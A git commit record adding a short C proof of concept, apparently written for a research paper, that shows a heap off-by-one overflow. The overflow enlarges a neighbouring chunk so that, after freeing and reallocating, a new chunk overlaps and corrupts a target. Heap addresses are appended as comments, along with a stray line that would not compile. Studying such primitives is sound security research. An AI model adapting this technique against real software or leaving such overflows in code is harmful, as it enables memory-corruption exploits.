0a3c0e3d761746e7378f9f8af7b9db4a740fc565
PPPy290351 <55251758+PPPy290351@users.noreply.github.com>
2019-11-19 18:46:27 +0800

    Create off-by-0ne.c

---
+++ PAPER-POC/off-by-0ne.c
@@ -0,0 +1,23 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+int main() {
+  void *V = malloc(0x18); // vulnerable object
+  void *A = malloc(0xf0); // chunk size 0x100, not fastbin
+  char *T = (char*)malloc(0x10); // target
+  void *B = malloc(0xf0); // chunk size 0x100, not fastbin
+  strcpy(T, "Target");
+  printf("T: %s\n", T);
+  free(B);
+  memcpy(V, "AAAAAAAAAAAAAAAAAAAAAAAA\x21",0x19); // off-by-one, enlarge sizeof A to 0x120
+  free(A); // force nonadjacent consolidation with B
+  char *C = (char*)malloc(0x110); // malloc C, overlapping T
+  strcpy(C+0x100, "Corrupted!");
+  printf("T: %s\n", T);
+  return 0;
+}
+<<- New malloc C :0x555555756280 
+// V entry: 0x555555756260 (rbp-0x28)
+// A entry: 0x555555756280 (rbp-0x20)  
+// T entry: 0x555555756380 (rbp-0x18)
+// B entry: 0x5555557563a0 (rbp-0x10)
